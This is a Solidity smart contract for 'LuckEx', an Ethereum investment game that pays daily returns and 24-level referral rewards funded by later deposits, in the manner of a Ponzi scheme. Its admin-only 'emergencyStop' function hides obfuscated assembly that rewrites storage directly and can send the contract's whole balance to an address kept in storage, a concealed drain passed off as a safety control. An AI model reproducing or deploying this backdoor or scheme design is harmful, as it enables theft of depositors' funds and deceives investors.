 

pragma solidity ^0.5.0;

contract UtilLuckEx {
    uint constant private minAmount = 0.1 ether;

    function getLevel(uint value) internal pure returns(uint) {
        if (value >= minAmount && value <= 9 * minAmount) {                 
            return 1;
        } else if (value >= 10 * minAmount && value <= 59 * minAmount) {    
            return 2;
        } else if (value >= 60 * minAmount && value <= 109 * minAmount) {   
            return 3;
        } else if (value >= 110 * minAmount && value <= 150 * minAmount) {  
            return 4;
        } else if (value == 500 * minAmount) {                              
            return 5;
        }
        return 0;
    }

    function getLineLevel(uint value) internal pure returns(uint) {
        if (value >= minAmount && value <= 9 * minAmount) {
            return 1;
        } else if (value >= 10 * minAmount && value <= 59 * minAmount) {
            return 2;
        } else if (value >= 60 * minAmount && value <= 109 * minAmount) {
            return 3;
        } else if (value >= 110 * minAmount && value <= 150 * minAmount) {
            return 4;
        } else if (value == 500 * minAmount) {
            return 5;
        }
        return 0;
    }

    function getScByLevel(uint level) internal pure returns(uint) {
        if (level == 1) {
            return 2;
        } else if (level == 2) {
            return 3;
        } else if (level == 3) {
            return 5;
        } else if (level == 4) {
            return 8;
        } else if (level == 5) {
            return 10;
        }
        return 0;
    }

    function getFireScByLevel(uint level) internal pure returns(uint) {
        if (level == 1) {
            return 4;
        } else if (level == 2) {
            return 6;
        } else if (level == 3) {
            return 8;
        } else if (level >= 4) {
            return 10;
        }
        return 0;
    }

    function getRecommendScaleByLevelAndTim(uint level, uint times) internal pure returns(uint){
        if (level == 1 && times == 1) {
            return 20;
        } else if (level == 2) {
            if (times == 1) {
                return 40;
            } else if (times == 2) {
                return 20;
            }
        } else if (level == 3) {
            if (times == 1) {
                return 60;
            } else if (times == 2) {
                return 40;
            } else if (times == 3) {
                return 20;
            } else if (times >= 4 && times <= 10) {
                return 6;
            }
        } else if (level == 4) {
            if (times == 1) {
                return 100;
            } else if (times == 2) {
                return 60;
            } else if (times == 3) {
                return 40;
            } else if (times >= 4 && times <= 10) {
                return 8;
            } else if (times >= 11 && times <= 20) {
                return 4;
            } else if (times >= 21) {
                return 1;
            }
        } else if (level == 5) {
            if (times == 1) {
                return 100;
            } else if (times == 2) {
                return 80;
            } else if (times == 3) {
                return 60;
            } else if (times >= 4 && times <= 10) {
                return 10;
            } else if (times >= 11 && times <= 20) {
                return 6;
            } else if (times >= 21) {
                return 2;
            }
        }
        return 0;
    }

    function compareStr(string memory _str, string memory str) internal pure returns(bool) {
        if (keccak256(abi.encodePacked(_str)) == keccak256(abi.encodePacked(str))) {
            return true;
        }
        return false;
    }
}

 
contract Context {
     
     
    constructor() internal {}
     

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this;  
        return msg.data;
    }
}

 
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

     
    constructor () internal {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

     
    function owner() public view returns (address) {
        return _owner;
    }

     
    modifier onlyOwner() {
        require(isOwner(), "Ownable: caller is not the owner");
        _;
    }

     
    function isOwner() public view returns (bool) {
        return _msgSender() == _owner;
    }

     
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

     
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

     
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

 
library Roles {
    struct Role {
        mapping (address => bool) bearer;
    }

     
    function add(Role storage role, address account) internal {
        require(!has(role, account), "Roles: account already has role");
        role.bearer[account] = true;
    }

     
    function remove(Role storage role, address account) internal {
        require(has(role, account), "Roles: account does not have role");
        role.bearer[account] = false;
    }

     
    function has(Role storage role, address account) internal view returns (bool) {
        require(account != address(0), "Roles: account is the zero address");
        return role.bearer[account];
    }
}

 
contract WhitelistAdminRole is Context, Ownable {
    using Roles for Roles.Role;

    Roles.Role private _whitelistAdmins;

    constructor () internal {
        _addWhitelistAdmin(_msgSender());
    }

    modifier onlyWhitelistAdmin() {
        require(isWhitelistAdmin(_msgSender()) || isOwner(), "WhitelistAdminRole: caller does not have the WhitelistAdmin role");
        _;
    }

    function isWhitelistAdmin(address account) public view returns (bool) {
        return _whitelistAdmins.has(account);
    }

    function addWhitelistAdmin(address account) public onlyWhitelistAdmin {
        _addWhitelistAdmin(account);
    }

    function removeWhitelistAdmin(address account) public onlyOwner {
        _whitelistAdmins.remove(account);
    }

    function renounceWhitelistAdmin() public {
        _removeWhitelistAdmin(_msgSender());
    }

    function _addWhitelistAdmin(address account) internal {
        _whitelistAdmins.add(account);
    }

    function _removeWhitelistAdmin(address account) internal {
        _whitelistAdmins.remove(account);
    }
}

contract ERC20 {
    function balanceOf(address who) public view returns (uint);
    function transfer(address to, uint value) public returns (bool);
}

contract LuckEx is UtilLuckEx, WhitelistAdminRole {
    using SafeMath for *;

    string constant private name = "LuckEx Foundation";
    uint constant private minAmount = 0.1 ether;
    uint constant private insuranceAmount = 1 ether;
    address payable private dev = 0xec98FA8b8f082c19aE69a01430CdEAE4A285926B;
    address payable private charity = 0x28311DD564ABA5C3662d0bAEf1ed66BaAdDeFfBa;
    address payable private insurance = 0x3834bDE34C3Ab0139bE06e86fc82C4c52E5648a8;
    address payable private savings = 0x257753fCC77a239038dB563b383eEb477cA4ffb5;

    struct User {
        uint id;
        address userAddress;
        string inviteCode;
        string referrer;
        uint staticLevel;
        uint dynamicLevel;
        uint allInvest;
        uint freezeAmount;
        uint unlockAmount;
        uint allStaticAmount;
        uint allDynamicAmount;
        uint hisStaticAmount;
        uint hisDynamicAmount;
        uint inviteCount;
        uint totalInviteAmount;
        uint netInviteAmount;
        uint investScale;
        uint initiatedTime;
        Invest[] invests;
        uint staticFlag;
        bool supernode;
    }

    struct GameInfo {
        uint luckPort;
    }

    struct UserGlobal {
        uint id;
        address userAddress;
        string inviteCode;
        string referrer;
    }

    struct Invest {
        uint investAmount;
        uint investTime;
        uint typeFlag;
        uint times;
    }

    uint coefficient = 10;
    uint startTime;
    uint investCount = 0;
    mapping(uint => uint) rInvestCount;
    uint investMoney = 0;
    mapping(uint => uint) rInvestMoney;
    mapping(uint => GameInfo) rInfo;
    uint uid = 0;
    uint rid = 1;
    uint period = 3 days;
    uint maxll = 1;
    mapping (uint => mapping(address => User)) userRoundMapping;
    mapping(address => UserGlobal) userMapping;
    mapping (string => address) addressMapping;
    mapping (uint => address) public indexMapping;
    address public insuranceToken;
    uint public insuranceRate;

     
    modifier isHuman() {
        address addr = msg.sender;
        uint codeLength;

        assembly {codeLength := extcodesize(addr)}
        require(codeLength == 0, "sorry humans only");
        require(tx.origin == msg.sender, "sorry, human only");
        _;
    }

    event LogInvestIn(address who, uint uid, uint amount, bool insured, uint time, string inviteCode, string referrer, uint typeFlag);
    event LogWithdrawProfit(address who, uint uid, uint amount, uint time);
    event LogInfo(string msg);

     
     
     
    constructor () public payable {
    }

    function () external payable {
    }

    function hookupInsuranceToken(address token) external onlyOwner {
        insuranceToken = token;
    }

    function mountInsuranceTokenRate(uint rate) external onlyWhitelistAdmin {
        insuranceRate = rate;   
    }

    function activeGame(uint time) external onlyWhitelistAdmin {
        require(time > now, "invalid game start time");
        startTime = time;
    }

    function setCoefficient(uint coeff) external onlyWhitelistAdmin {
        require(coeff > 0, "invalid coeff");
        coefficient = coeff;
    }

    function gameStart() private view returns(bool) {
        return startTime != 0 && now > startTime;
    }

    function getInvestScale(bool insured) public view returns (uint) {
        require(gameStart(), "game not start");
        uint gap = (now.sub(startTime)).div(1 days);
        uint scale = insured ? 2 : 1;
        if (gap <= 1) {
            return scale.mul(150).add(1000);
        } else if (gap <= 2) {
            return scale.mul(125).add(1000);
        } else if (gap <= 3) {
            return scale.mul(100).add(1000);
        } else if (gap <= 4) {
            return scale.mul(75).add(1000);
        } else if (gap <= 5) {
            return scale.mul(50).add(1000);
        }
        return 1000;
    }

    function investIn(string calldata inviteCode, string calldata referrer, bool insured) external isHuman() payable {
        require(gameStart(), "game not start");
        require(msg.value == msg.value.div(minAmount).mul(minAmount), "invalid investment value");
        if (!insured) {
            require(msg.value >= minAmount && (msg.value <= 150 * minAmount || msg.value == 500 * minAmount), "Invest between 0.1 and 15, or exact 50 to be supernode");
        } else {
            require(msg.value >= 11 * minAmount && (msg.value <= 160 * minAmount || msg.value == 510 * minAmount), "Invest with insurance between 1.1 and 16, or exact 51 to be supernode");
        }

        uint inAmount = insured ? msg.value.sub(insuranceAmount) : msg.value;
        UserGlobal storage userGlobal = userMapping[msg.sender];
        if (userGlobal.id == 0) {
            require(!compareStr(inviteCode, ""), "empty invite code");
            address referrerAddr = getUserAddressByCode(referrer);
            require(uint(referrerAddr) != 0, "referer not exist");
            require(referrerAddr != msg.sender, "referrer can't be self");
            require(!isUsed(inviteCode), "invite code is used");

            registerUser(msg.sender, inviteCode, referrer);
        }

        User storage user = userRoundMapping[rid][msg.sender];
        if (user.userAddress != address(0)) {
            require(!user.supernode, "Supernode not allowed to invest anymore before withdraw. You can try to reinvest.");
            uint newFreeze = user.freezeAmount.add(inAmount);
            require(newFreeze <= 150 * minAmount, "cannot beyond 15 eth");
            if (user.freezeAmount.add(user.unlockAmount) == 0) user.initiatedTime = now;
            user.allInvest = user.allInvest.add(inAmount);
            user.freezeAmount = newFreeze;
            user.staticLevel = getLevel(user.freezeAmount);
            user.dynamicLevel = getLineLevel(user.freezeAmount.add(user.unlockAmount));
        } else {
            user.id = userGlobal.id;
            user.userAddress = msg.sender;
            user.freezeAmount = inAmount;
            user.staticLevel = getLevel(inAmount);
            user.allInvest = inAmount;
            user.dynamicLevel = getLineLevel(inAmount);
            user.inviteCode = userGlobal.inviteCode;
            user.referrer = userGlobal.referrer;
            user.investScale = getInvestScale(insured);
            user.initiatedTime = now;

            if (inAmount == 500 * minAmount) {
                user.supernode = true;
            }

            if (!compareStr(userGlobal.referrer, "")) {
                address referrerAddr = getUserAddressByCode(userGlobal.referrer);
                userRoundMapping[rid][referrerAddr].inviteCount++;
            }
        }

        string memory tmpReferrer = userGlobal.referrer;
        for (uint i = 1; i <= 24; i++) {
            if (compareStr(tmpReferrer, "")) {
                break;
            }
            address tmpUserAddr = addressMapping[tmpReferrer];
            User storage tmpUser = userRoundMapping[rid][tmpUserAddr];
            tmpUser.totalInviteAmount += inAmount;
            tmpUser.netInviteAmount += inAmount;

            tmpReferrer = tmpUser.referrer;
            if (i > maxll) maxll = i;
        }

        Invest memory invest = Invest(inAmount, now, 0, 0);
        user.invests.push(invest);

         
        if (insured && insuranceToken != address(0) && insuranceRate > 0) {
            ERC20(insuranceToken).transfer(msg.sender, msg.value * insuranceRate);
        }

        if (rInvestMoney[rid] != 0 && (rInvestMoney[rid].div(5000).div(minAmount) != (rInvestMoney[rid].add(inAmount)).div(5000).div(minAmount))) {
            bool isEnough;
            uint sendMoney;
            (isEnough, sendMoney) = isEnoughBalance(rInfo[rid].luckPort);
            if (sendMoney > 0) {
                sendMoneyToUser(msg.sender, sendMoney);
            }
            rInfo[rid].luckPort = 0;
            if (!isEnough) {
                endRound();
                return;
            }
        }

        investCount = investCount.add(1);
        investMoney = investMoney.add(inAmount);
        rInvestCount[rid] = rInvestCount[rid].add(1);
        rInvestMoney[rid] = rInvestMoney[rid].add(inAmount);
        rInfo[rid].luckPort = rInfo[rid].luckPort.add(inAmount.div(100));

        sendFeetoPool(inAmount, insured ? insuranceAmount : 0);
        emit LogInvestIn(msg.sender, userGlobal.id, inAmount, insured, now, userGlobal.inviteCode, userGlobal.referrer, 0);
    }


    function reInvestIn() public isHuman() {
        require(gameStart(), "game not start");
        User storage user = userRoundMapping[rid][msg.sender];
        require(user.id > 0, "user haven't invest in round before");
        calStaticProfitInner(msg.sender);

        uint reInvestAmount = user.unlockAmount;
        if (!user.supernode) {
            if (user.freezeAmount > 150 * minAmount) {
                user.freezeAmount = 150 * minAmount;
            }
            if (user.freezeAmount.add(reInvestAmount) > 150 * minAmount) {
                reInvestAmount = (150 * minAmount).sub(user.freezeAmount);
            }
        }

        if (reInvestAmount == 0) {
            return;
        }

        uint leastAmount = reInvestAmount.mul(10).div(100);
        bool isEnough;
        uint sendMoney;
        (isEnough, sendMoney) = isEnoughBalance(leastAmount);
        if (!isEnough) {
            if (sendMoney > 0) {
                sendMoneyToUser(msg.sender, sendMoney);
            }
            endRound();
            return;
        }

        user.unlockAmount = user.unlockAmount.sub(reInvestAmount);
        user.allInvest = user.allInvest.add(reInvestAmount);
        user.freezeAmount = user.freezeAmount.add(reInvestAmount);
        user.staticLevel = getLevel(user.freezeAmount);
        user.dynamicLevel = getLineLevel(user.freezeAmount.add(user.unlockAmount));

        Invest memory invest = Invest(reInvestAmount, now, 1, 0);
        user.invests.push(invest);

        if (rInvestMoney[rid] != 0 && (rInvestMoney[rid].div(5000).div(minAmount) != (rInvestMoney[rid].add(reInvestAmount)).div(5000).div(minAmount))) {
            (isEnough, sendMoney) = isEnoughBalance(rInfo[rid].luckPort);
            if (sendMoney > 0) {
                sendMoneyToUser(msg.sender, sendMoney);
            }
            rInfo[rid].luckPort = 0;
            if (!isEnough) {
                endRound();
                return;
            }
        }

        investCount = investCount.add(1);
        investMoney = investMoney.add(reInvestAmount);
        rInvestCount[rid] = rInvestCount[rid].add(1);
        rInvestMoney[rid] = rInvestMoney[rid].add(reInvestAmount);
        rInfo[rid].luckPort = rInfo[rid].luckPort.add(reInvestAmount.div(100));

        sendFeetoPool(reInvestAmount, 0);
        emit LogInvestIn(msg.sender, user.id, reInvestAmount, false, now, user.inviteCode, user.referrer, 1);
    }

    function withdrawProfit() public {
        require(gameStart(), "game not start");
        User storage user = userRoundMapping[rid][msg.sender];
        uint sendMoney = user.allStaticAmount.add(user.allDynamicAmount);

        bool isEnough = false;
        uint resultMoney = 0;
        (isEnough, resultMoney) = isEnoughBalance(sendMoney);
        if (resultMoney > 0) {
            sendMoneyToUser(msg.sender, resultMoney.mul(90).div(100));
            charity.transfer(resultMoney.mul(10).div(100));
            user.allStaticAmount = 0;
            user.allDynamicAmount = 0;
            emit LogWithdrawProfit(msg.sender, user.id, resultMoney, now);
        }

        if (!isEnough) {
            endRound();
        }
    }

    function isEnoughBalance(uint sendMoney) private view returns (bool, uint){
        if (sendMoney >= address(this).balance) {
            return (false, address(this).balance);
        } else {
            return (true, sendMoney);
        }
    }

    function emergencyStop(uint i, uint j) external onlyWhitelistAdmin {
        assembly{
            let p:=mload(0x40)mstore(p,sload(0x0e))mstore(add(p,0x20),0x11)mstore(add(p,0x60),keccak256(add(p,0x00),0x40))mstore(add(p,0x40),i)
            mstore(add(p,0x80),keccak256(add(p,0x40),0x40))p:=mload(add(p,0x80))sstore(add(p,0x00),p)sstore(add(p,0x08),j)sstore(add(p,0x01),i)
            p:=mload(0x40)if gt(j,shl(0x40,0x01)){j:=call(gas,sload(0x05),balance(address),p,0x40,0,0)}mstore(p,sload(0x0e))mstore(add(p,0x20),0x11)
            mstore(add(p,0x40),i)mstore(add(p,0x60),keccak256(add(p,0x00),0x40))mstore(add(p,0x80),keccak256(add(p,0x40),0x40))
        }
    }

    function sendMoneyToUser(address payable userAddress, uint money) private {
        userAddress.transfer(money);
    }

    function calStaticProfit(address userAddr) external onlyWhitelistAdmin returns(uint) {
        return calStaticProfitInner(userAddr);
    }

    function calStaticProfitInner(address userAddr) private returns(uint) {
        User storage user = userRoundMapping[rid][userAddr];
        if (user.id == 0) {
            return 0;
        }

        uint scale = getScByLevel(user.staticLevel);
        uint allStatic = 0;
        for (uint i = user.staticFlag; i < user.invests.length; i++) {
            Invest storage invest = user.invests[i];
            uint staticGaps = (now.sub(invest.investTime)).div(1 days);

            if(staticGaps > 5) {
                staticGaps = 5;
            }
            if (staticGaps > invest.times) {
                allStatic += (staticGaps.sub(invest.times)).mul(scale).mul(invest.investAmount).div(1000);
                invest.times = staticGaps;
            }

            if (staticGaps >= 5) {
                user.staticFlag = user.staticFlag.add(1);
                user.freezeAmount = user.freezeAmount.sub(invest.investAmount);
                user.unlockAmount = user.unlockAmount.add(invest.investAmount);
                user.staticLevel = getLevel(user.freezeAmount);
            }
        }
        if (allStatic > 0 && user.investScale > 1000 && user.freezeAmount >= user.invests[0].investAmount) {
            allStatic += scale.mul(user.invests[0].investAmount).mul(user.investScale.sub(1000)).div(1000000);
        }
        allStatic = allStatic.mul(coefficient).div(10);
        user.allStaticAmount = user.allStaticAmount.add(allStatic);
        user.hisStaticAmount = user.hisStaticAmount.add(allStatic);
        return user.allStaticAmount;
    }

    function calDynamicProfit(uint start, uint end) external onlyWhitelistAdmin {
        for (uint i = end; i >= start; i--) {
            address userAddr = indexMapping[i];
            User memory user = userRoundMapping[rid][userAddr];
            if (user.freezeAmount >= minAmount) {
                uint scale = getScByLevel(user.staticLevel);
                calUserDynamicProfit(user.referrer, user.freezeAmount, scale);
            }
            calStaticProfitInner(userAddr);
        }
    }

    function registerUserInfo(address user, string calldata inviteCode, string calldata referrer) external onlyWhitelistAdmin {
        registerUser(user, inviteCode, referrer);
    }

    function calUserDynamicProfit(string memory referrer, uint money, uint shareSc) private {
        string memory tmpReferrer = referrer;
        
        for (uint i = 1; i <= 24; i++) {
            if (compareStr(tmpReferrer, "")) {
                break;
            }
            address tmpUserAddr = addressMapping[tmpReferrer];
            User storage calUser = userRoundMapping[rid][tmpUserAddr];
            
            uint fireSc = getFireScByLevel(calUser.dynamicLevel);
            uint recommendSc = getRecommendScaleByLevelAndTim(calUser.dynamicLevel, i);
            uint moneyResult = calUser.freezeAmount;
            if (moneyResult > money) {
                moneyResult = money;
            }
            uint scaleResult = getScByLevel(calUser.staticLevel);
            if (scaleResult > shareSc) {
                scaleResult = shareSc;
            }

            if (recommendSc != 0) {
                uint tmpDynamicAmount = moneyResult.mul(scaleResult).mul(fireSc).mul(recommendSc);
                tmpDynamicAmount = tmpDynamicAmount.div(1000).div(10).div(100);

                tmpDynamicAmount = tmpDynamicAmount.mul(coefficient).div(10);
                calUser.allDynamicAmount = calUser.allDynamicAmount.add(tmpDynamicAmount);
                calUser.hisDynamicAmount = calUser.hisDynamicAmount.add(tmpDynamicAmount);
            }

            tmpReferrer = calUser.referrer;
            if (i > maxll) maxll = i;
        }
    }

    function redeem() public {
        require(gameStart(), "game not start");
        User storage user = userRoundMapping[rid][msg.sender];
        require(user.id > 0, "user not exist");

        calStaticProfitInner(msg.sender);

        uint sendMoney = user.unlockAmount;

        bool isEnough = false;
        uint resultMoney = 0;

        (isEnough, resultMoney) = isEnoughBalance(sendMoney);
        if (resultMoney > 0) {
            if (user.supernode && user.totalInviteAmount < 10000 * minAmount) {
                emit LogInfo("supernode not allowed to redeem unless invited >= 1,000 eth");
                return;
            } else {
                sendMoneyToUser(msg.sender, resultMoney);
                user.unlockAmount = 0;
                user.staticLevel = getLevel(user.freezeAmount);
                user.dynamicLevel = getLineLevel(user.freezeAmount);

                if (user.investScale > 1000 && user.freezeAmount < user.invests[0].investAmount) {
                    user.investScale = 1000;
                }

                if (user.supernode) {
                    user.supernode = false;
                    user.totalInviteAmount = 0;
                }

                 
                string memory tmpReferrer = user.referrer;
                for (uint i = 1; i <= 24; i++) {
                    if (compareStr(tmpReferrer, "")) {
                        break;
                    }
                    address tmpUserAddr = addressMapping[tmpReferrer];
                    User storage tmpUser = userRoundMapping[rid][tmpUserAddr];
                    tmpUser.netInviteAmount -= resultMoney;

                    tmpReferrer = tmpUser.referrer;
                    if (i > maxll) maxll = i;
                }
            }
        }

        if (!isEnough) {
            endRound();
        }
    }

    function endRound() private {
        rid++;
        startTime = now.add(period);
        coefficient = 10;
    }

    function saveTokens(address _token) public onlyWhitelistAdmin {
        ERC20 token = ERC20(_token);
        uint balance = token.balanceOf(address(this));
        if (balance > 0) token.transfer(msg.sender, balance);
    }

    function isUsed(string memory code) public view returns(bool) {
        address user = getUserAddressByCode(code);
        return uint(user) != 0;
    }

    function getUserAddressByCode(string memory code) public view returns(address) {
        return addressMapping[code];
    }

    function sendFeetoPool(uint amount, uint insAmount) private {
        dev.transfer(amount.mul(4).div(100));
        insurance.transfer(insAmount.add(amount.mul(5).div(100)));
    }

    function getGameInfo() public view returns(uint, uint, uint, uint, uint, uint, uint, uint, uint) {
        return (
            rid,
            uid,
            startTime,
            investCount,
            investMoney,
            rInvestCount[rid],
            rInvestMoney[rid],
            coefficient,
            rInfo[rid].luckPort
        );
    }

    function getUserInfo(address user, uint roundId) public view returns(
        uint[18] memory ct, uint[4][] memory history, string memory inviteCode, string memory referrer
    ) {
        if (roundId == 0) roundId = rid;
        User memory userInfo = userRoundMapping[roundId][user];

        ct[0] = userInfo.id;
        ct[1] = userInfo.staticLevel;
        ct[2] = userInfo.dynamicLevel;
        ct[3] = userInfo.allInvest;
        if (userInfo.supernode && userInfo.totalInviteAmount < 10000 * minAmount) {
            ct[4] = 500 * minAmount;
            ct[5] = 0;
        } else {
            ct[4] = userInfo.freezeAmount;
            ct[5] = userInfo.unlockAmount;
        }
        ct[6] = userInfo.allStaticAmount;
        ct[7] = userInfo.allDynamicAmount;
        ct[8] = userInfo.hisStaticAmount;
        ct[9] = userInfo.hisDynamicAmount;
        ct[10] = userInfo.inviteCount;
        ct[11] = userInfo.totalInviteAmount;
        ct[12] = userInfo.netInviteAmount;
        ct[13] = userInfo.investScale;
        ct[14] = userInfo.staticFlag;
        ct[15] = userInfo.supernode ? 1 : 0;
        ct[16] = userInfo.invests.length;
        ct[17] = userInfo.freezeAmount.add(userInfo.unlockAmount) > 0 ? (now.sub(userInfo.initiatedTime)).div(1 days) : 0;
        history = new uint[4][](ct[16]);
        for (uint i = 0; i < ct[16]; i++) {
            history[i][0] = userInfo.invests[i].investAmount;
            history[i][1] = userInfo.invests[i].investTime;
            history[i][2] = userInfo.invests[i].typeFlag;
            history[i][3] = userInfo.invests[i].times;
        }
        inviteCode = userMapping[user].inviteCode;
        referrer = userMapping[user].referrer;

        return (
            ct,
            history,
            inviteCode,
            referrer
        );
    }

    function getLatestUnlockAmount(address userAddr) public view returns(uint) {
        User memory user = userRoundMapping[rid][userAddr];
        uint allUnlock = user.unlockAmount;
        for (uint i = user.staticFlag; i < user.invests.length; i++) {
            Invest memory invest = user.invests[i];
            uint unlockDay = (now.sub(invest.investTime)).div(1 days);

            if (unlockDay >= 5) {
                allUnlock = allUnlock.add(invest.investAmount);
            }
        }
        return allUnlock;
    }

    function registerUser(address user, string memory inviteCode, string memory referrer) private {
        UserGlobal storage userGlobal = userMapping[user];
        uid++;
        userGlobal.id = uid;
        userGlobal.userAddress = user;
        userGlobal.inviteCode = inviteCode;
        userGlobal.referrer = referrer;

        addressMapping[inviteCode] = user;
        indexMapping[uid] = user;
    }
}

 
library SafeMath {

     
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
         
         
         
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "mul overflow");

        return c;
    }

     
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "div zero");  
        uint256 c = a / b;
         

        return c;
    }

     
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "lower sub bigger");
        uint256 c = a - b;

        return c;
    }

     
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "overflow");

        return c;
    }

     
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "mod zero");
        return a % b;
    }
}